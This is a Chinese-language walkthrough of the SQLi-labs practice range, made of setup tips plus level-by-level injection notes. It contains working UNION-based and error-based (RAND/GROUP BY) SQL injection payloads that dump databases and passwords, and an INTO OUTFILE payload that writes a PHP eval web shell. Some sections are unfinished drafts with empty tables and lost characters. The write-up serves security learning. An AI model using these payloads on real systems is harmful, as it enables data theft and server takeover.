# SQL注入
# §1 SQLi-lab

[SQLI labs](https://github.com/Audi-1/sqli-labs)是一个基于PHP和MySQL的开源SQL注入靶场。本节介绍各个安装流程和常踩的坑。

## §1.1



## §1.2 注意事项

## 

### §1.2.1 `mysql`和`mysqli`

在初始化数据库时，即使已经启用了`php_mysql.dll`扩展，可能仍然会遇到找不到`mysql_connect()`的报错：

```
PHP Fatal error: Uncaught Error: Call to undefined function mysql_connect()
```

根据[PHP官方文档](https://www.php.net/manual/en/function.mysql-connect.php)，从PHP 5.5.0版本起，`php_mysql.dll`扩展将被弃用，取而代之的是`php_mysqli.dll`和`php_pdo_mysql.dll`。而该靶场使用的函数定义于被弃用的扩展中，所以会报错。要么把所有`mysql_`开头的函数全部替换成`mysqli_`，要么回退到PHP旧版本。

### §1.2.2 魔法引号

PHPStudy在`php.ini`中默认开启了魔法引号功能，该功能可以在GET/POST/COOKIE中的所有单引号、双引号、反斜杠、`\0`NULL字符之前加上反斜杠进行转义。该靶场的payload都基于这些特殊字符，因此一定要关闭该功能。

```ini
; Magic quotes for incoming GET/POST/Cookie data.
magic_quotes_gpc = Off
```

### §1.2.3 HackBar吞空格

众所周知，SQL语句的注释符`--`后面必须加一个空格，才能后接注释文本，否则该注释无效，并引起报错。而HackBar这款浏览器插件好死不死的吞末尾空格，导致你必须给`GET`请求的参数后手动添加一个UrlEncode空格字符`%20`才行。

### §1.2.4 Url编码`+`被替换为空格

根据[这篇StackOverflow问题下的回答](https://stackoverflow.com/questions/1005676/does-a-in-a-url-scheme-host-path-represent-a-space)，在历史上，Url编码规则经历了多个不同的标准：

- 在[RFC-1738](https://www.ietf.org/rfc/rfc1738.txt)标准中，为防止`&`等特殊字符干扰参数值导致二义性，需要将其准换成`%hh`形式。但是该标准本身没有提到如何处理`+`这一字符。[HTML 401](https://www.w3.org/TR/html401/)标准的[§17.13.4 Form content types](https://www.w3.org/TR/html401/interact/forms.html#h-17.13.4.1)一节中进行了补充，特别说明**空格被编码成`+`**。

  > <center>application/x-www-form-urlencoded</center>
  >
  > This is the default content type. Forms submitted with this content type must be encoded as follows:
  > `x-www-form-urlencoded`是默认使用的内容格式，使用这种格式提交的内容必须符合以下编码规则：
  >
  > 1. Control names and values are escaped. Space characters are replaced by `+`, and then reserved characters are escaped as described in `RFC1738`, section 2.2:...
  >    控制字符必须经过转义。**空格字符应被替换为`+`**，其余的保留字符应按照`RFC1738`2.2节的标准进行转义：...
  > 2. ...

- 在[RFC-3986](https://www.rfc-editor.org/rfc/rfc3986#section-2.4)标准中，所有可能产生二义性的字符都必须被强制转义，包括空格。

  > <center>2.4 When to Encode or Decode</center>
  >
  > When a URI is dereferenced, the components and subcomponents significant to the scheme-specific dereferencing process (if any) must be parsed and separated before the percent-encoded octets within those components can be safely decoded, as otherwise the data may be mistaken for component delimiters.
  > 在该标准规定的解码流程中，当URI被解码时，如果存在干扰该流程的组件与子组件，那么这些组件与子组件必须经过转换，从而与真正的分隔符区分开来，然后才能保证Url编码不会造成二义性，否则这些组件与子组件可能被误认为是组件分割符。

根据PHP的关于[超全局变量`$_GET[]`](https://www.php.net/manual/zh/reserved.variables.get.php)和[函数`urlencode()`](https://www.php.net/manual/zh/function.urldecode.php)的官方文档，`$_GET[]` 是通过`urldecode()`传递的，而该函数执行的恰好是`RFC-1738`标准，会将`+`替换为空格。另有`rawurldecode()`函数执行的是`RFC-3986`标准。

> <center>$_GET</center>
>
> 注意:GET是通过[urldecode()](https://www.php.net/manual/zh/function.urldecode.php)传递的。
>
> <center>urldecode()</center>
>
> 解码给出的已编码字符串中的任何 `%##`。加号（`+`）被解码成一个空格字符。
>
> <center>rawurldecode()</center>
>
> 注意:`rawurldecode()`不会把加号（`+`）解码为空格，而`urldecode()`可以。
>

### §1.2.5 SQL中的`'`与`''`

SQL中的字符串两侧可以用单引号或双引号。当使用单引号时，如果字符串中还包含单引号，就会引起二义性：

```sql
SELECT * FROM ... WHERE title='I'm a CTFer';
```

这时，我们应该给字符串中的单引号进行转义，变成`''`的形式：

```sql
SELECT * FROM ... WHERE title='I''m a CTFer';
```

????????????????????[四种方式](https://www.databasestar.com/sql-escape-single-quote/)

### §1.2.6 SQL的括号/引号嵌套

| 外层\payload |      |      |      |      |      |
| ------------ | ---- | ---- | ---- | ---- | ---- |
|              |      |      |      |      |      |
| ''           |      |      |      |      |      |
| ""           |      |      |      |      |      |
| ''''         |      |      |      |      |      |
| """"         |      |      |      |      |      |
| ()           |      |      |      |      |      |
| ('')         |      |      |      |      |      |
| ("")         |      |      |      |      |      |
| '()'         |      |      |      |      |      |
| "()"         |      |      |      |      |      |
|              |      |      |      |      |      |



## §2.1 第1关 绕过`''`

我们以这行代码入手：

```php
$sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";
```

显然，`$id`中若含有单引号便可实现逃逸的效果，比如最经典的`1' or '1'='1`。

了解后，我们假装不知道源代码，开始逐步构建payload，猜测语句结构。

首先试一下正常输入，均正常：

```sql
id=1		-- Login name: Dumb		Password: Dumb
id=2		-- Login name: Angelina	Password: I-kill-you
id=1000		-- Login name: 			Password:
```

尝试单引号，报错；尝试两个单引号，正常。可以猜测语句中肯定包含单引号。同时`LIMIT`告诉我们最多输出一条结果。

```sql
id=1		-- Login name: Dumb		Password: Dumb
id=1'		-- You have an error in your SQL syntax; ... near ''1'' LIMIT 0,1' at line 1
id=1''		-- Login name: Dumb		Password: Dumb
```

知道语句包含单引号后，我们就可以猜测语句大概如下所示：

```sql
SELECT ? FROM ? WHERE ?='$id' LIMIT 0,1 ? ;
```

接下来使用`ORDER BY`爆列数，同时使用`--`注释掉`LIMIT`语句，得到列数为3：

```sql
id=1 ORDER BY 1 --  (一定要在--后面加空格,才能识别为有效的注释)
=> SELECT ? FROM ? WHERE ?='   1' ORDER BY 1 --   ' LIMIT 0,1 ? ;
=> SELECT ? FROM ? WHERE ?='1' ORDER BY 1;
			-- Login name: Dumb		Password: Dumb
id=1‘ ORDER BY 2 -- 
=> SELECT ? FROM ? WHERE ?='   1' ORDER BY 2 --   ' LIMIT 0,1 ? ;
=> SELECT ? FROM ? WHERE ?='1' ORDER BY 2;
			-- Login name: Dumb		Password: Dumb
id=1‘ ORDER BY 3 -- 
=> SELECT ? FROM ? WHERE ?='   1' ORDER BY 3 --   ' LIMIT 0,1 ? ;
=> SELECT ? FROM ? WHERE ?='1' ORDER BY 3;
			-- Login name: Dumb		Password: Dumb
id=1‘ ORDER BY 4 -- 
=> SELECT ? FROM ? WHERE ?='   1' ORDER BY 4 --   ' LIMIT 0,1 ? ;
=> SELECT ? FROM ? WHERE ?='1' ORDER BY 4;
			-- Unknown column '4' in 'order clause'
```

利用`SELECT 1,2,3`建一张列数同样为3的新表，使用`UNION`语句爆字段与列序的关系。虽然注释了`LIMIT`，但是前端始终只显示一条记录，因此我们还要在`WHERE`中设置一个自相矛盾的条件，来把正常的那条记录给干掉，只留下我们的创建的新表：

```sql
id=1' union select 1,2,3 -- 
=> SELECT * FROM users WHERE id='1' union select 1,2,3 -- ' LIMIT 0,1
			+----+----------+----------+
			| id | ???????? | ???????? |
			+----+----------+----------+
			|  1 | Dumb     | Dumb     |
			|  1 | 2        | 3        |
			+----+----------+----------+
			-- Login name: Dumb		Password: Dumb
id=2' and 1=2 union select 1,2,3 -- 
=> SELECT * FROM users WHERE id='2' and 1=2 union select 1,2,3 -- ' LIMIT 0,1
			+----+----------+----------+
			| id | ???????? | ???????? |
			+----+----------+----------+
			|  1 | 2        | 3        |
			+----+----------+----------+
			-- Login name: 2		Password: 3
			可知第二列与用户名相关,第三列与密码相关
```

用`database()`函数爆当前SQL语句执行的数据库名：

```sql
id=1' AND 1=2 UNION SELECT 1,DATABASE(),3 --+
=> SELECT * FROM users WHERE id='1' AND 1=2 UNION SELECT 1,DATABASE(),3 -- ' LIMIT 0,1
			-- Login name: security	Password: 3
			可知当前数据库名为security
```

用`information_schema`数据库中的`schemata`表爆所有数据库名，果然存在之前爆出的`security`：

```sql
id=1' AND 1=2 union select 1,(select group_concat(schema_name) from information_schema.schemata),3 -- 
=> SELECT * FROM users WHERE id='1' AND 1=2 union select 1,(select group_concat(schema_name) from information_schema.schemata),3 -- ' LIMIT 0,1
			+----+----------------------------------------------------------------------+----------+
			| id | ????????                                                             | ???????? |
			+----+----------------------------------------------------------------------+----------+
			|  1 | information_schema,challenges,mysql,performance_schema,security,test | 3        |
			+----+----------------------------------------------------------------------+----------+
			-- Login name: information_schema,challenges,mysql,performance_schema,security,test		Password: 
```

用`information_schema`数据库中的`tables`表爆`security`数据库的所有表名：

```sql
id=1' AND 1=2 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 -- 
=> SELECT * FROM users WHERE id='1' AND 1=2 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 -- ' LIMIT 0,1
			-- Login name: emails,referers,uagents,users	-- Password: 3
```

猜测`users`表存放着用户数据。用`information_schema`数据库中的`columns`表，爆`security`数据库中`users`表的所有列名：

```sql
id=1' AND 1=2 UNION SELECT 1,(SELECT GROUP_CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'),3 --+
=> SELECT * FROM users WHERE id='1' AND 1=2 UNION SELECT 1,(SELECT GROUP_CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'),3 -- ' LIMIT 0,1
			-- Login name: id,username,password		-Password: 3
```

根据列名爆全表：

```sql
id=1' AND 1=2 UNION SELECT 1,(SELECT GROUP_CONCAT(username) FROM security.users),(SELECT GROUP_CONCAT(password) FROM security.users) --+
SELECT * FROM users WHERE id='1' AND 1=2 UNION SELECT 1,(SELECT GROUP_CONCAT(username) FROM security.users),(SELECT GROUP_CONCAT(password) FROM security.users) -- ' LIMIT 0,1
			-- Login name: Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4
			-- Password: Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4
```

## §2.2 第2关 不绕过

先按正常流程试一遍：

- `id=1`，正常
- `id=1'`，报错，`Wrong syntax near '' LIMIT 0,1' at line 1`
- `id=1''`，报错，`Wrong syntax near ''' LIMIT 0,1' at line 1`

至此可推断，SQL语句肯定没有形如`'id'`的部分，而是直接将`id`暴露在外。只需将第1关中的payload从`id=1'`改为`id=1`即可，其余步骤同上。

## §2.3 第3关 绕过`('')`

先按正常流程试一遍：

- `id=1`，正常
- `id=1'`，报错，`Wrong syntax near ''1'') LIMIT 0,1' at line 1`
- `id=1''`，正常

因为两个单引号正常，所以一定有``''`。容易发现，相比与第2关，单引号报错多了一个右括号。将`1'`看作一个整体，报错信息给出的部分语句形如`'$id') LIMIT 0,1`，立即可以推测出语句为`WHERE ?=('$id')`。只需将第1关中的payload从`id=1'`改为`id=1')`即可，其余步骤同上。

## §2.4 第4关 绕过`("")`

先按正常流程试一遍：

- `id=1`，正常
- `id=1'`，正常
- `id=1''`，正常

再试一下双引号：

- `id=1"`：报错，`Wrong syntax to use near '"1"") LIMIT 0,1' at line 1`
-  `id=1""`：正常

类比于第3关，报错信息给出的部分语句形如`"$id") LIMIT 0,1`。只需将第1关中的payload从`id=1'`改为`id=1")`即可，其余步骤同上。

## §2.5 第5关

先按正常流程试一遍：

- `id=1`，正常
- `id=1'`，报错，`Wrong syntax to use near ''1'' LIMIT 0,1' at line 1`
- `id=1' --+`，正常
- `id=1"`，正常

据此可推测，SQL语句中无双引号，且形如`'$id' LIMIT 0,1`。

`ORDER BY`爆列数为4：

```sql
id=1' ORDER BY 3 --+
=> SELECT ? FROM ? WHERE ID='1' ORDER BY 3 -- ' LIMIT 0,1
		# You are in...........
id=1' ORDER BY 4 --+
=> SELECT ? FROM ? WHERE ID='1' ORDER BY 4 -- ' LIMIT 0,1
		# Unknown column '4' in 'order clause'
```

尝试`SELECT`爆字段与列序的关系，结果未返回任何一个期望值，这说明返回值与数据库无关，是一个写死的值：

```sql
id=1’ and 1=2 union select 1,2,3 --+
		# You are in...........	(不是1,2,3种的任何一个)
```

这种情况下，输出正常只能告诉我们语句执行成功，不能输出我们想要的信息，只能通过输出报错了。以下步骤的原理详见[§3.1 双查询注入](#§3.1 双查询注入)一节：

```sql
id=1' union select 1,count(*), concat((select database()), floor(rand()*2))as a from information_schema.tables group by a --+
=> SELECT * FROM users WHERE id='1' union select 1,count(*), concat((select database()), floor(rand()*2))as a from information_schema.tables group by a -- ' LIMIT 0,1;
=> SELECT * FROM users WHERE id='1' union select 1,count(*), concat((select database()), floor(rand()*2))as a from information_schema.tables group by a;
		--	Duplicate entry 'security0' for key 'group_key'
		我们构建的恶意payload:database()得到了执行.
```

其余步骤同上。

1' union select 1,count(*), concat((
select concat( (select group_concat(username) from security.users) , (select group_concat(password) from security.users) , floor(rand()*2) )
), floor(rand()*2))as a from information_schema.tables group by a



SELECT * FROM users WHERE id='1' union select 1,count(*), concat((
select concat( (select group_concat(username) from security.users) , (select group_concat(password) from security.users) , floor(rand()*2) )
), floor(rand()*2))as a from information_schema.tables group by a;





http://localhost/SQLi-labs/Less-5/
?id=1' union select 1,count(*), concat(

(    select concat( (select group_concat(username) from security.users) , (select group_concat(password) from security.users)    )     ),
floor(rand()*2)

)  as a from information_schema.tables group by a --+





select count(*), concat((select group_concat(username) from security.users), floor(rand()*2))as a from *information_schema.tables* group by a

??????????????????????????????





## §2.7 第七关 导出数据库

老三样：

- `id=1`，正常
- `id=1'`，报错
- `id=1''`，正常
- `id=1"`，正常
- `id=1""`，正常

两个单引号、两个双引号都正常，说明`$id$`在引号内。单引号报错，双引号正常，说明`$id$`在单引号内。

- `id=1' --+`

注释掉后面的单引号后仍然报错，说明单引号外还有东西包着。经过穷举可知是`(('$id'))`。

```
id=1‘)) union select null,'<?php eval($_GET('test')) ?>',null into outfile './1.php' 
```

 

# §3 SQL注入方法论

## §3.1 双查询注入

子查询的格式是`(SELECT (payload))`，该语句的作用相当于创建一张新表，可以根据将payload解析为字段名或表达式，MySQL对其计算后返回相应的计算值。

```sql
SELECT CONCAT((SELECT 1+1));
			+----------------------+
			| CONCAT((SELECT 1+1)) |
			+----------------------+
			| 2                    |
			+----------------------+
```

同理，我们可以给payload传MySQL内置的各类函数：

```sql
SELECT CONCAT((SELECT DATABASE()));
			+-----------------------------+
			| CONCAT((SELECT DATABASE())) |
			+-----------------------------+
			| security                    |
			+-----------------------------+
SELECT CONCAT(
    	(
            SELECT GROUP_CONCAT(TABLE_NAME) 
   			FROM INFORMATION_SCHEMA.TABLES
   			WHERE TABLE_SCHEMA='security'
        )
	)
	AS something;
			+-------------------------------+
			| something                     |
			+-------------------------------+
			| emails,referers,uagents,users |
			+-------------------------------+
```

2016年，一位用户发现并提交了MySQL中[RAND()引发的运行时错误](https://bugs.mysql.com/bug.php?id=82544)，官方确认后将其写入到[官方文档](https://dev.mysql.com/doc/refman/5.7/en/mathematical-functions.html#function_rand)中：

> Use of a column with RAND() values in an ORDER BY or GROUP BY clause may yield unexpected results because for either clause a RAND() expression can be evaluated multiple times for the same row, each time returning a different result.
> 如果在`ORDER BY`或`GROUP BY`子句中使用的列名含有`RAND()`函数的表达式，则可能会输出不可预料的结果。这是因为在这些子句对`SELECT`筛选出的记录进行处理、计数、归类、排序的过程中，将会反复调用用户指定的列名。而列名中包含`RAND()`函数，这导致就算是对于同一行记录而言，子句每次进行处理、计数、归类、排序时使用的标准都有可能不一样。

`RAND()`本身不一样并不可怕，例如官方文档我们可以用`ORDER BY RAND()`实现乱序随机输出。可怕的是根据抽屉原理，在足够的样本面前，含有`RAND()`的表达式会造成“一样”，这种一样才是最可怕的。当一样时，程序会爆出`ERROR 1062 (23000): Duplicate entry '<ColumnNameWithRAND()>' for key 'group_key'`的错误。其中`<ColumnNameWithRAND()>`是所需表达式执行后的结果，利用这一点可以实现错误注入。

```sql
SELECT CONCAT((SELECT database()),floor(rand()*2)) AS something
	FROM INFORMATION_SCHEMA.TABLES
	WHERE TABLE_SCHEMA='security';
			+-----------+
			| something |
			+-----------+
			| security0 |
			| security0 |
			| security1 |
			| security0 |
			+-----------+
SELECT CONCAT((SELECT database()),floor(rand()*2)) AS something
	FROM INFORMATION_SCHEMA.TABLES
	WHERE TABLE_SCHEMA='security'
	GROUP BY something;
			+-----------+
			| something |
			+-----------+
			| security0 |
			| security1 |
			+-----------+
-- 执行下列语句会得到不同的结果，自检得到成功频率=41/80，失败频率=39/80，大概五五开
SELECT
	COUNT(*),
	CONCAT((SELECT database()),floor(rand()*2)) AS something
	FROM INFORMATION_SCHEMA.TABLES
	WHERE TABLE_SCHEMA='security'
	GROUP BY something;
			-- ERROR 1062 (23000): Duplicate entry 'security0' for key 'group_key'
		或者
			+----------+-----------+
			| COUNT(*) | something |
			+----------+-----------+
			|        2 | security0 |
			|        2 | security1 |
			+----------+-----------+
```

